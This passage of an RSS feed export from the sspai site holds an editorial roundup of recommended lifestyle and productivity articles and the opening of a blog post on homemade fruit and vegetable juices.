[{"title":"不读可以先收藏 01 | 让这些好文章为你的稍后读加点料","date":"2021-07-21 09:16:58","description":"\n<h4><strong>不读可以先收藏</strong></h4>\n<p>让有价值的内容保持生命力，是对少数派作者分享和创作精神的肯定，对刚刚接触少数派的读者而言，这些内容也是方便他们直达少数派内容和 Matrix 社区核心价值的钥匙。</p>\n<p>在这个不定期更新的栏目中，少数派编辑部将人工挑选过去一段时间内值得重读和收藏的文章，这些内容凝聚了作者的耕耘和读者的肯定，应该能为想读好内容的你献上一份数字时代的「合订本」。</p>\n<hr>\n<p>大家好，今天是 2021 年 7 月 21 日。本栏目的第一期，我们从过去推荐到首页的 1500 篇文章中挑选了 N 篇文章。</p>\n<p>如果有你喜欢的好文章，不妨把文章末尾的收藏按钮用起来。</p>\n<h2>这些文章可以先收藏</h2>\n<h3>《年度征文｜文科博士生眼里的资料管理、阅读和笔记系统》</h3>\n<p>作者：<a href=\"https://sspai.com/u/chyixian/posts\" target=\"_blank\">chyixian</a></p>\n<p>充电量：358；收藏量：798</p>\n<blockquote>\n<p>笔记书、整理术乃至发想创造术，它的意义应该在于对整体性程序逻辑的改善，而一旦改变了底层逻辑，同样的方法和工具就可以运用于各个领域，从这种意义上才可成为方法性的 revolution。反过来说，一切不涉及底层逻辑革新的所谓「方法论」，最终会流向肤浅化的工具论。这也是在摸索方法中的我所需要自勉的。</p>\n<p><a href=\"https://sspai.com/post/64795\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（北鸮）</strong>：在少数派，笔记应用、知识管理类型的文章总是一大热门，也有不少读者迷失在茫茫多的文章列表中，看着一个个功能繁多特色各异的应用犯愁，不知如何下手，选什么下手。或许你需要的，正是一个可以跟着尝试、带你思考的决策流程，那么这篇文章大概能帮上你的忙。</p>\n<p>本文的作者是一名留学日本的文科在读博士。她以自己对阅读、笔记、整理知识流程的思考，创作了这篇详细记述个人工作流的分享文章。从发现问题，到提出方案，直至实行与最后的反思，每一个步骤，作者都做了清晰的解释。不管你是同样从事学术工作，还是有其他的笔记整理需求，都可以跟随她的思考路程一起探索自己的知识管理法则。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/01/27/2d4f1ef7181b40c259a1763176ca9cf6.png\" alt=\"\"></figure><h3>《买到扩容 iPad 不会维权？看看我怎么让卖家「退一赔三」》</h3>\n<p>作者：<a href=\"https://sspai.com/u/qmfming/posts\" target=\"_blank\">青苗法鸣</a></p>\n<p>充电量：472；收藏量：321</p>\n<blockquote>\n<p>可是我哪有这么好忽悠啊？在店铺的另一条链接的提问区和评论区，有非常多的人反映商品是扩容机（我之前没看到这个链接，百密一疏），说明我绝非个例。如果只有我一家到扩容机，确实有可能是供应商不厚道。现在一大堆人跳出来说有问题，说明店家是专门卖扩容机、靠坑蒙拐骗赚黑心钱的。发现并曝光问题的买家尚且有这么多，那那些没发现的呢？我都不敢想了。</p>\n<p>况且，在 3 月底的时候，我就跟卖家发出严正警告，又通过各种渠道投诉卖家，卖家无动于衷。四月初，我在评论区直接公开举报：此乃扩容机，把起诉书贴了上去，结果卖家直接把产品下架了，新建一个链接卖！呵呵，现在倒好，收到传票了，良心发现了？</p>\n<p><a href=\"https://sspai.com/post/67209\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（Tp）</strong>：这是一篇少数派罕有的「爽文」，通篇读下来总会让人有热血沸腾的感觉。纵使抛开「读得爽」的特点，这篇文章也颇具可圈可点之处。无论是作者死磕到底的「折腾」精神，还是对维权流程的详细记录，都可以看出作者身为法学生对于法律严谨负责的态度。其中证据的收集、提交等过程，也具有一定的参考价值，可以应用到自身的维权当中去。</p>\n<p>交易纠纷或许是我们生活中难以避开的一个「大坑」，但许多人往往会选择忍气吞声，自认倒霉，让不法分子有了更多可乘之机。希望这篇文章可以让你重新燃起对「维权」的信心，拿起法律武器保护自己的权益。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/e913638c-adbf-4dfd-fb96-e81d5d0074ba.jpg\" alt=\"\"></figure><h3>《外出就餐，如何把食物拍得更好看》</h3>\n<p>作者：<a href=\"https://sspai.com/u/Microhoo/posts\" target=\"_blank\">Microhoo</a></p>\n<p>充电量：320；收藏量：352</p>\n<blockquote>\n<p>……那这时候你首先需要做到的两件事是坚持和真诚。前者顾名思义，后者则是拍摄食物就是拍摄食物，你可以附带告知这家好吃的店，可以尽力形容它的优秀，甚至可以罗列如何去制作它；但一定不是借机炫耀自己去了高级饭店，也不是想要用它衬托自己的美貌，更不是借其聊表心意——尊重它。</p>\n<p><a href=\"https://sspai.com/post/63848\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（Clyde）</strong>：从这篇文章可以看出，和 Clyde 这种混脸熟打入内部的角色不同，小虎加入少数派编辑部全凭实力——开个玩笑，不过这篇文章背后的确是有故事的。</p>\n<p>因为当时的一篇社区文章，编辑部有了「如何才能把食物拍得好看」的讨论，在聊到这个选题时，我脑海中浮现的第一个作者其实不是别人，正是当时已经加入少数派编辑部的小虎；就像文章里所说，如果你在社交平台（尤其是某个以图片分享为主的社交平台）上关注了小虎，应该也会对文中「一看就是小虎拍的」这种感觉并不陌生。</p>\n<p>文中围绕外出拍摄食物这个话题所提供的思路——突出主体保持画面干净、通过整齐的画面表现丰盛感、捕捉和食物两相宜的诱人场景，都是在实际拍摄过程中拿起手机、打开相机就容易遗忘，若是想起则能有效提升成片效果的平实技巧。</p>\n<p>当然，最重要、也是留给我个人印象最深刻的还是上面摘录的那句话，更多的时候我们或许应该先摆正心态——拍摄食物不是借机炫耀、也不是用它衬托什么，尊重它并且赞美它就好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/12/01/2dd71b56e5af94c5e52192bdd72a5e4e.jpg\" alt=\"\"></figure><h3>《看了十张年度书单，我挑选出这 16 本不容错过的好书》</h3>\n<p>作者：<a href=\"https://sspai.com/u/y5gchf65/posts\" target=\"_blank\">蛋挞西瓜</a></p>\n<p>充电量：336；收藏量：607</p>\n<blockquote>\n<p>书业作为非基本生活必需之行业，在这次疫情中更是受到重创，许多出版社都难以为继，诚品书店深圳店也在 2020 年的最后一天关上了大门。一本书的面世，背后有着选题策划、编辑加工、装帧设计、宣传推广等一整套的出版流程，而新书的寿命只有三个月，没卖出去就再难见天日，书店上架两星期，不动销就下架，现在正是读者扫一眼、翻一下，就决定是否购买的快消时代。</p>\n<p>正所谓「风萧萧兮易水寒，各种标点各种难。垂死病中惊坐起，千万不要做编辑」，出版业的工资水平偏低，而且也不会成名，只是为他人做嫁衣。有时候图书的宣传还要帮着办办读书会、开开直播，让读者认识、了解新书。所谓鞍前马后，也就大概这个意思了吧。</p>\n<p>所以感谢这些站在一线的出版人，感谢那些坚守到最后的实体书店工作者，还要感谢一直与书作伴的「你们」，是大家的努力，是这一小撮人的喜爱和热忱，让世界再乱、环境再难，我们仍可以说出那句「但是还有书籍」。</p>\n<p><a href=\"https://sspai.com/post/64664\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（张奕源 Nick）</strong>：尽管我派读者中爱读书的朋友不少，但我们却很少系统地制作图书推荐类内容。图书推荐看似简单，但仔细筹划起来，从选书到撰写推荐语其实都不容易。蛋挞西瓜的这篇图书推荐以「年度书单」为底，同时涵盖了小说、社科、访谈、非虚构乃至漫画绘本等不同品类的书籍，既引入了各图书排行榜的综合排名，也融入了个人的阅读经历和感受，有态度，也有温度。</p>\n<p>蛋挞西瓜在文章结尾的这段话饱含对图书出版业的人文关怀，也体现出他本人对书籍和阅读的热爱。近期恰逢暑假假期，如果你正想选一本合适的好书读一读，这份书单值得一阅。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/924491b3-12f5-b620-04de-e5b0960e4672.png\" alt=\"\"></figure><h3>《非设计师也该学的排版知识 01：视觉动线》</h3>\n<p>作者：<a href=\"https://sspai.com/u/gmvccwqi/posts\" target=\"_blank\">oooooohmygosh</a></p>\n<p>充电量：362；收藏量：363</p>\n<blockquote>\n<p>总之无论如何，读者的「视觉动线」必须在你的掌握之中，很多觉得自己排版杂乱无章的设计师其实就是因为在一开始便放弃了掌握视觉动线的权利。</p>\n<p>如果画面中的元素与要表达的内容过多，你就要先整理信息，梳理主次，确定版面中真正的视觉落点在哪里，并将剩余的元素划分段落，然后精心设计阅读顺序。</p>\n<p><a href=\"https://sspai.com/post/62392\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（广陵止息）</strong>：现代社会无论是谁都要和设计搭点边——学生时代要做宣传手册，找工作时要制作简历，工作时要做到 PPT。而懂一点设计常识不仅可以让做出来的东西更美观，还可以减少「试错」所需要的时间，加快你完成这些内容的速度，而这也是我推荐这篇内容的主要原因。</p>\n<p>本文并不从枯燥的理论出发讲解「视觉动线」这个概念。而是从实际的例子入手，生动形象地解释了为什么「视觉动线」、怎么做是正确的以及有什么好处，即使是对设计毫无基础常识的大多数读者来说也非常易于理解。文章中的例子也与日常生活里大家需要做的设计内容紧密关联，相信下次你再制作类似内容时也可以帮到你许多。</p>\n<p>当然，oooooohmygosh 的「非设计师」系列也不止这一篇文章，<a href=\"https://sspai.com/u/gmvccwqi/posts\" target=\"_blank\">其他文章</a> 同样也可以帮你认识到设计的重要性，让你的内容不仅实用也能变得好看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/5401fcd9-9f26-440d-745d-f6cc70548d54.png\" alt=\"\"></figure><h3>《用好 Keynote 和 iMovie，在 iPad 上做出有高级感的视频》</h3>\n<p>作者：<a href=\"https://sspai.com/u/b1yetc0l/posts\" target=\"_blank\">缝纫机动队</a></p>\n<p>充电量：315；收藏量：433</p>\n<blockquote>\n<p>最近看到越来越多的设计类自动化工具，可能某种程度上，过去那些需要较高学习成本的工作都可以轻松实现，并且精度也越来越接近手动，移动平台如果不出意外，大有在民间取代传统个人电脑的趋势，也让越来越多的普通人参与到设计和摄影当中。</p>\n<p>对于艺术创作来说，它变得更混乱了，而这对于许多人来说既是福祉，也是考验。</p>\n<p>最后纠正一下我之前说的「设计的核心是创意」，实际上我思考了一下以后觉得设计的核心可能是功能。</p>\n<p><a href=\"https://sspai.com/post/61882\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（waychane）</strong>：与其一直争论「iPad 是不是生产力工具」，不如思考如何用手中设备创造价值，本文作者「缝纫机动队」就是这样通过身体力行告诉我们，什么才是「别人家的 iPad」。不是设计师、也不是摄影师，更没有经过专业培训，只用随手可得的 iPad 和人人可用的 App，让静态图像「活」了起来。</p>\n<p>从「纯净度」和「陌生感」出发，本文介绍了几种常见动画效果的实现方法，人人都能学以致用，制作出具有「高级感」的视频内容。当然，读完本文，也希望你能从中获得灵感与思路，用好手中的 iPad，为自己创造价值。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/c21a4d68-c86d-2f64-9e0a-aeb1d5911271.gif\" alt=\"\"></figure><h3>《如何追求精力充沛的生活》</h3>\n<p>作者：<a href=\"https://sspai.com/u/zimpo3jv/posts\" target=\"_blank\">sainho</a></p>\n<p>充电量：457；收藏量：649</p>\n<blockquote>\n<p>在讨论「如何管理精力」时，我们绝不能简单地追求一个完美的解决方案，然后套用在自己身上。身体条件、睡眠、饮食、环境等因素的差异，让每个人只能从自己的情况出发，去选择适合自己的精力管理方式。</p>\n<p>除去客观因素的影响，我们自己的情绪也是导致精力错位原因之一。人本来就有畏难情绪，讨厌面对困难的任务。现在高度发达的互联网又让人容易产生「信息缺乏恐慌症」，所以早晨起床后先刷半小时的微博抖音醒一醒觉，开始工作后先和同事聊几句，看一圈自己感兴趣的网页等等行为，已经变成一天的常态。殊不知如此一来，自己已经从刚起床的满血状态逐渐下滑。</p>\n<p>为了克服情绪因素对精力的浪费，最直接的方法就是应对不同场景，将自己的行为流程化。预期通过内心对自己的要求，将行为流程化更容易实现，久而久之，自己的行为也会逐渐改善自己的情绪。</p>\n<p><a href=\"https://sspai.com/post/61722\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（Lotta）</strong>：阅读精力管理的文章，并不是要照搬某个人的计划或方案，更多地是从中提取出较为普适的方法论，寻找到与自身情况相匹配的灵感或启发，这篇文章的写作目的与作用就在于此。文章从什么是精力开始，介绍了保持深度工作、克服精力浪费的方法，并从休息、睡眠、饮食三个方面提供了实用且易操作的小建议来提高精力上限。此外，文章中还提到了不少有关时间/精力管理的参考文章和书籍，丰富书单的同时也方便大家追本溯源，建立独属于自己的方法论。</p>\n<p>虽然文章中举出的多是作者在家办公的案例，但对于想合理利用下班时间来自我提升的工作党和暑假想要居家学习的学生党也同样适用。因为「由畏难情绪而导致精力错位」的现象，似乎在每个人身上都找得到它的影子。而「将自己的行为流程化」，安排一些轻松愉悦易完成的小事在开始和结束之前，也确实是一个改善情绪的好方法。当然前提是不要沉迷在这些小事里🌚。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/4cefb4cc-426a-afc4-b17d-0c3958c224dc.jpg\" alt=\"\"></figure><h2>值得关注的专栏内容</h2>\n<h3>《为什么中美互联网头部公司的业务是一一对应的？》</h3>\n<p>作者：<a href=\"https://sspai.com/u/z28ec0rm/posts\" target=\"_blank\">王龙行</a></p>\n<p>充电量：6；收藏量：6</p>\n<blockquote>\n<p>在看纪录片《美国商业大亨传奇》的时候，第一次想到。这个纪录片只讲了美国最成功的商人，为什么是洛克菲勒、卡内基、摩根成为了商业巨头？</p>\n<p>因为他们都是在历史机遇中，抓住了某一项惠及到最普通大众人群的技术变革。洛克菲勒抓住了石油技术的应用，从照明到汽车都是最大众化的需求；卡内基抓住了工业社会的建筑和基建对现代钢铁技术的需求。</p>\n<p>而互联网，是石油、钢铁、汽车、电力之后的，又一个普惠最大众的人群的技术应用。而互联网技术的具体应用场景中，大众人群都需要的、不因国家-文化-语言-地区而区别的场景，就是电商、通讯与社交、搜索这几个。这就是中美互联网巨头一一对应的原因。</p>\n<p><a href=\"https://sspai.com/post/66947\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（sainho）</strong>：<a class=\"ss-atUser\" data-mention=\"@王龙行\" user-id=\"bveph6k4o16dhal7rnn0\" href=\"https://sspai.com/u/z28ec0rm\">@王龙行</a> 曾在微博做PM，也有过七年的创业经历。他主理的专栏「<a href=\"https://sspai.com/column/265\" target=\"_blank\">newsletter 那些事</a>」，介绍自己正在用 newletter 这种阅读方式，来分享自己的内容创作经历。在专栏里，他会分享自己的碎片化思考、工作笔记、优质内容推荐，关注创业经验总结、对商业的思考、关注的创业故事与启发。</p>\n<p>在我看来，他的文章的价值不在于从中我能学到什么商业知识或是创业机会，而是去观察、模仿和学习他思考的方式，然后内化成自己的能力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/a40e926408255dc44042ef1d836c5f0c.jpg\" alt=\"\"></figure><h3>《DPS 周刊 01 - 如何努力？》</h3>\n<p>作者：<a href=\"https://sspai.com/u/evqgshj3/posts\" target=\"_blank\">DrSelfie</a></p>\n<p>充电量：1；收藏量：1</p>\n<blockquote>\n<p>技术公司和传统公司很不一样的一点就是内部的开放程度。Gergely Orosz 介绍了 Uber 在内部如何公开技术文档：<br>1. 在开发前做规划；<br>2. 把这个规划写成一个文档；<br>3. 在开始工作之前，让别人批准这个规划；<br>4. 将这份计划文件发给公司的所有工程师；<br>5. 让每个人都遵循上述步骤，除非是非常小的项目；<br>这样做的好处之一就是所有人都有机会了解这些项目，如果有建议或者意见也可以提出，降低了项目间可能的冲突，也降低了重复造轮子的可能性。</p>\n<p><a href=\"https://sspai.com/post/67756\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（sainho）</strong>：</p>\n<p>如果你质疑「生产力」是一门玄学，欢迎你来看看 <a class=\"ss-atUser\" data-mention=\"@DrSelfie\" user-id=\"bs2pg3lb34tcs0poqv1g\" href=\"https://sspai.com/u/evqgshj3\">@DrSelfie</a> 主理的「<a href=\"https://sspai.com/column/266\">生产力周报</a>」专栏。<br>和阅读、锻炼等事情一样，生产力的提升取决于能否长期地优化自我行为，这就要求我们：</p>\n<ol>\n<li>放弃短时间能获取这些能力的幻想；</li>\n<li>从细节开始改变自己。</li>\n</ol>\n<p>前者是一种自我心理过程，很遗憾没有人能帮自己。但是后者，是「生产力周报」想解决的问题。</p>\n<p>在「<a href=\"https://sspai.com/column/266\">生产力周报</a>」的文章中，会分享不同行业、不同公司中的专业人士，如何改进自我的工作流程或方法论，来提高自己的生产力。如果你有兴趣，还可以点进他整理的每日生产力分享（Daily Productive Sharing ），寻找更多提高生产力的灵感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/17/96bae94fc453ffb06547a83c9aed2397.jpg\" alt=\"\"></figure><h2>这些文章读者也爱看</h2>\n<p>🤖️ ：作为编辑部中的重要一份子，机器人也参与了此次文章推荐，不过作为一坨冷冰冰的铁块，本机器人更侧重从剩下的文章里通过多个参数来综合推荐，不带一丝丝人情味呢。就请大家欣赏这掺杂着铁锈味儿的推荐吧：</p>\n<h3>《对快餐式修图不满意？收下这份六年 VSCO 使用经验》</h3>\n<p>作者：<a href=\"https://sspai.com/u/Irisleilei/posts\" target=\"_blank\">Irisleilei</a></p>\n<p>充电量：451；收藏量：1070</p>\n<blockquote>\n<p>使用 6 年的过程中，身边不少朋友都向我问过「你可以分享调整的参数吗？」「你可以出一个教程吗？」诸如此类。分享预设不过是一张截图即可完成的事情，所以并非是懒惰作祟，可能是<strong>我内心更希望大家能享受自己使用、探索 VSCO 的过程吧。</strong></p>\n<p>就好似在旅途中，究竟是我们低着脑袋跟着导航走到预想的终点，还是放下导航跟随着路旁的指引牌和当时的心情走向我们当时想要到达的终点呢。</p>\n<p><a href=\"https://sspai.com/post/66842\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/25/2a7174a36af8ef7344c29cf98333fa18.jpg\" alt=\"\"></figure><h3>《不买可以先收藏 06：筛选房源的第一步，读懂户型图》</h3>\n<p>作者：<a href=\"https://sspai.com/u/a54ag05p/posts\" target=\"_blank\">sleep9ull</a></p>\n<p>充电量：400；收藏量：1086</p>\n<blockquote>\n<p>一般而言，购房者最关注的就是户型图了。但户型图只能看到家中的细节，其他环境的细节通常还需要依赖总平面图和楼层平面图。也就是说我们选房时要结合总平面图、楼层平面图和户型图一起来看，这样我们就能在选房时及时看到这间房子所有的不利因素，避免我们买到房子以后才发现「踩了大坑」。</p>\n<p><a href=\"https://sspai.com/post/67379\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/47cb91f4-2b32-0ec8-1cf0-864a8c9e4d1e.png\" alt=\"\"></figure><h3>《普通人如何入门投资理财？》</h3>\n<p>作者：<a href=\"https://sspai.com/u/4b7xrpql/posts\" target=\"_blank\">Vivi__</a></p>\n<p>充电量：534；收藏量：777</p>\n<blockquote>\n<p>在这之前，要先和大家先强调一下<strong>储蓄</strong>的重要性，其实本质上说是<strong>复利</strong>的重要性，查理芒格说过：「明白了复利作用的威力和了解了想要取得它的难度状况，就是认识其他投资事项的开端。」每个人都向往财务自由，那你有没有想过具体如何实现呢？作为普通人，请明白是<strong>储蓄而非收入让人变得富有</strong>，所以较好的实现途径是<strong>靠储蓄投资，利用复利的魔力来实现</strong>，其实无论是投资，亦或是人生其他事情，复利都发挥着非常重要的作用。</p>\n<p><a href=\"https://sspai.com/post/63255\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/10/22/a394a2b337c11b4a4828b3180ac26030.jpg\" alt=\"\"></figure><h3>《三万字装修经验「验收」：少数派编辑家装导览》</h3>\n<p>作者：<a href=\"https://sspai.com/u/Microhoo/posts\" target=\"_blank\">Microhoo</a></p>\n<p>充电量：496；收藏量：962</p>\n<blockquote>\n<p>通常我们都会在家具家电进场前做一次深度的开荒保洁，隔天阿姨收尾后已经是中午，我自己又用纸巾把客厅的地面擦了一遍，然后把五十多斤重的地毯铺上。本来想躺在上面试一下这个地毯硬不硬，结果不小心睡着了，也不知道睡了多久被阳台射进来的阳光晃醒，一头混沌的想着呀，这就结束了啊，我好像终于可以搬家了。</p>\n<p>——这就是装修之后入住之前最让我最记忆犹深的一刻，往前在做这件事的时候常抱怨装修真的好辛苦，但在新家醒来的第一个清晨就全然忘光了，不过时常看着家里每一个让自己引以为傲的巧思和陈设，都明白这是那会儿每一分心思付尽的收获。</p>\n<p><a href=\"https://sspai.com/post/64420\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/0436b33b-82c8-03c4-bc29-217ee2eb6034.jpg\" alt=\"\"></figure><h3>《新年换新衣，关于衣物的挑选与购买》</h3>\n<p>作者：<a href=\"https://sspai.com/u/9mwqi1gg/posts\" target=\"_blank\">书藏</a></p>\n<p>充电量：465；收藏量：855</p>\n<blockquote>\n<p>挑选是我们付款前做的最后一件事。我认为，服装搭配的过程不应当放在穿衣服的时候，而是购买前挑选的时候就要想好买的这件衣服要和哪些已有的衣服搭配，或者为了它还要买哪些衣服。在挑选的时候，我们要关心的问题包括衣服的样式、面料、颜色、做工等，这些都会在这篇文章里慢慢介绍。</p>\n<p><a href=\"https://sspai.com/post/63925\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/12/09/c819f8037387fd0182d731a98375530c.jpg\" alt=\"\"></figure><h3>《你的家庭小药箱，从这 8 种非处方药开始》</h3>\n<p>作者：<a href=\"https://sspai.com/u/zsspass/posts\" target=\"_blank\">医嘱吟唱者</a></p>\n<p>充电量：459；收藏量：830</p>\n<blockquote>\n<p>本文<strong>不构成任何医疗建议。</strong></p>\n<p><a href=\"https://sspai.com/post/66590\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/12/9d6e24903a155ab959c3fd87d526909d.jpg\" alt=\"\"></figure><h3>你也可以参与文章推荐活动</h3>\n<p>以上便是本期「不读可以先收藏」要推荐给大家的全部内容。喜欢的文章居然没有上榜？这合理吗？</p>\n<p>⚡️️ 欢迎各位读者一起来评论区参与「文章推荐」活动，我们将挑选部分内容呈现在下期栏目中的「这些文章读者也爱看」部分。评论投稿内容可以参考本期栏目内容的格式：</p>\n<ul>\n<li>文章链接；</li>\n<li>推荐人（可空，默认为评论者的少数派昵称）；</li>\n<li>精选段落；</li>\n<li>推荐语。</li>\n</ul>\n<p>赶紧向大家推荐你心中的好文章吧。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67830"},{"title":"三点几了，喝杯果蔬汁解忧愁吧","date":"2021-07-21 08:08:20","description":"\n<p>在城市生活的年轻人，应该有不少是靠外卖和速食解决一日三餐的，即便是出门吃饭，或者公司学校有食堂，大部分外食也都是重油重辣，碳水和肉食居多，猪扒盖饭、牛油火锅麻辣烫、回转寿司、小烧烤……太难吃到一份达到营养均衡标准的饭了。对营养有更多兴趣的朋友可以看一下中国营养协会2021年发布的<a href=\"http://dg.cnsoc.org/upload/affix/20210301174345895.pdf\" target=\"_blank\">《中国居民膳食指南科学研究报告》</a>。</p>\n<p>兼顾工作日快速的生活节奏和健康营养的饮食品质是我一直想要达到的平衡。</p>\n<h2><strong>饮用蔬果汁的初衷</strong></h2>\n<p>最开始想要自己制作蔬果汁的原因是感觉日常饮食不够健康，摄入的蔬菜种类少并且量也不多。工作日忙碌也来不及，在家做早餐通常会以碳水为主，面包、煎饼、饺子之类的，搭配一点水果，或者蔬菜沙拉，但要说完全做到荤素搭配，每天都能有足量的蔬菜摄入，确实有点难度。早上吃下一盘沙拉需要的时间，远比喝一杯蔬果汁要久，所以想到了蔬果汁作为解决方案。</p>\n<p>随着慢慢尝试制作蔬果汁，对它在日常餐食中的认识也有了一些新的变化。</p>\n<p>理想状态下，饮用蔬果汁可以增加食物摄入种类，通过几种食材搭配的方法，把平时因为种种原因不吃的食材添加进来，增加饮食的丰富度。平时不爱吃的苦瓜、胡萝卜，不容易在饮食中足量摄入的富含膳食纤维的食物，比如芹菜（西芹）等，都可以通过和其他食材搭配的方式，改善口感和味道，变成更容易入口的蔬果汁。</p>\n<p>想要一餐吃点 100g 蔬菜有时候确实不太容易，但 100g 蔬菜融入蔬果汁，喝起来就会顺利很多。</p>\n<p>当然在蔬果汁里增加一些饱腹类的坚果，或者水果比如香蕉、牛油果，也能帮助快速补充能量。由于蔬果汁制作快速，能在日常比较高效地达到均衡饮食的目的。快速打一杯蔬果汁，搭配早餐、午餐或者晚餐。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/10775f20944a0277700ec252f5695bca.jpg\"><figcaption>图片来源：Unsplash<a href=\"https://unsplash.com/@freestocks\" target=\"_blank\">@freestocks</a></figcaption></figure><h2><strong>初识蔬果汁</strong></h2>\n<p>蔬果汁比较标准的定义是蔬菜、水果、含有蛋白质的食材、含脂肪的食材以及富含其他风味进行调节的食材，按比较合理的比例随意组合，搅碎组合而成的饮品。但我也没有如此严格地按照什么都加的思路做，偶尔也有只包括其中一两种的情况，和家里食材的储存量有比较直接的关系😬。但一般还是会尽量按照什么都吃一点的原则进行。</p>\n<p>蔬果汁理论上不等同于果汁，单纯水果搭配组合榨取的果汁含糖量会比配合其他食材更高，不太建议经常饮用，尤其是健身减肥或者有健康隐患的人士。其次，因为水果偏甜的口感比蔬菜更容易入口，相信大部分人吃水果的量会远大于蔬菜，而蔬果汁是为了尽量弥补非水果类在日常饮食中的空缺。</p>\n<p>蔬果汁不能替代正餐。相对于其他饮品，蔬果汁包含的营养成分更高，有丰富的维生素、矿物质和膳食纤维，甚至蛋白质和健康的脂肪，并且能起到饱腹的效果，但不建议把蔬果汁当成一餐来饮用，更推荐把它当作正餐以外的补充，毕竟它只是为了调节日常饮食的丰富程度，作为正餐可能还是没有办法完全覆盖所有人体必需的营养成分。</p>\n<p>甚至也没有必要把它当作每餐必备的饮品，把它当作补充饮品或者好喝并且比市售饮料要健康的饮品来对待也可以。虽然现在很多欧美流行的健康生活方式或者减肥方法里，蔬果汁也占有一席之地，也有很多蔬果汁的饮食养生疗法，但我对这种饮食计划还是持怀疑态度的。</p>\n<p>在展开聊蔬果汁之前，建议大家不要因此过度相信蔬果汁的力量，毕竟均衡营养、平衡饮食，多运动以及保持良好的生活习惯才更像是健康的关键呢。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/886f69ec7ac479e0bb9bc4562f3ec9ec.jpg\"><figcaption>图片来源：Unsplash<a href=\"https://unsplash.com/@dosejuice\" target=\"_blank\">@dosejuice</a></figcaption></figure><h2><strong>蔬果汁的搭配法则</strong></h2>\n<p>刚开始尝试蔬果汁时，可以尝试多放一部分水果，稀释蔬菜的比例，尤其是青菜类，慢慢适应味道，之后逐渐提高蔬菜占据的比例，或者可以尝试用甜味、香味、鲜味更明显的食材，进行味道中和，比如椰奶、牛奶、香蕉、百香果、芒果等。我认为蔬果汁最理想的比例是50%以上的蔬菜搭配30%以下的水果，保证能比之前多一个途径摄入蔬菜。当然，为了让搅打的过程更加容易，并且保证口感上更顺滑，还需要加入一定比例的液体，可以是清水，也可以是其他。</p>\n<h3>常用的食材</h3>\n<p>如果以蔬果汁作为日常饮食的一部分，我自己的主张是尽量选择比较常见的食材，不好买到的食材囤在家里也不能达到最新鲜的食用效果。当然，为了拓展食材涉猎的范围，增加饮食多样性，探索更多食材的口感，做出更多合适自己口味的蔬果汁，也需要接触不太容易买到的食材。</p>\n<p>常见食材当然也和当地的地理区域有关，以下食材基本能在绝大多数地域比较方便买到，其他非生鲜类食材也可以通过电商平台购买。</p>\n<p><strong>水果类：</strong>苹果、梨、香蕉、芒果、菠萝、百香果、橙子、柠檬、牛油果、西瓜，等<br><strong>蔬菜类：</strong>菠菜、羽衣甘蓝、胡萝卜、黄瓜、芹菜、苦瓜、甘蓝菜，等<br><strong>液体类：</strong>纯净水、牛奶、酸奶、椰奶、豆奶、豆浆、茶、蜂蜜，等<br><strong>其他：</strong>奇亚籽、姜、薄荷、花生酱、可可粉、抹茶粉、燕麦、坚果、肉桂粉、杏仁粉，等</p>\n<figure class=\"image ss-img-wrapper\"><img 